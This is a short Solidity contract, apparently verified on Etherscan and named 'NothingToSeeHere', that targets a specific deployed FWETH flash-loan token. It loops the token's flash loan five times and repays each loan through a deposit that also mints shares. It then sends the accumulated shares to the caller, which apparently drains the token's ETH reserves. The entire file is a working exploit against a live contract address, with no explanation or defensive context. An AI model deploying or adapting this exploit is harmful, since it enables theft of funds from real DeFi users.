/**
 *Submitted for verification at Etherscan.io on 2021-12-27
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.9;

interface FWETH {
    function flashFee(address, uint256 amount) external view returns (uint256);
    function flashLoan(address receiver, address, uint256 amount, bytes calldata data) external returns (bool);
    function deposit() external payable;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address user) external returns (uint256);
    function withdraw(uint256 share) external;
    function totalSupply() external view returns (uint256);
}

contract NothingToSeeHere {
    
    FWETH private constant fweth = FWETH(0x8E70b088c56548D92d224EAdfbac539eFEef3eff);
    address private constant deployer = 0x1C0Aa8cCD568d90d61659F060D1bFb1e6f855A20;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    function mintExtra() public payable {
        for(uint256 i = 0; i < 5; i++) {
            fweth.flashLoan(address(this), address(0), address(fweth).balance, "");
        }        
        uint256 shares = fweth.balanceOf(address(this));
        fweth.transfer(msg.sender, shares);
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes memory
    ) external returns (bytes32) {
        fweth.deposit{value: amount + fee}();
        return CALLBACK_SUCCESS;
    }

    receive() external payable {}

}